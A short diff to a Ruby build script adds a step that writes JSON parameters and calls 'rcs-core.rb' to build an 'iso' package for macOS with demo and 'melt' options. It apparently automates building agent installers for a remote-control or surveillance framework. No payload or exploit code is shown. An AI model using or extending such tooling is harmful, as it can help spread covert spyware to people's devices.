@@ -53,4 +53,14 @@ params = {platform: 'u3',
 File.open('build.json', 'w') {|f| f.write params.to_json}
 system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o u3.zip"
 ###################################################################################################
+params = {platform: 'iso',
+          generate: {platforms: ['osx'],
+                     binary: {demo: true, admin: false},
+                     melt: {admin: false}
+                    }
+          }
+
+File.open('build.json', 'w') {|f| f.write params.to_json}
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o iso.zip"
+###################################################################################################
 puts "End"
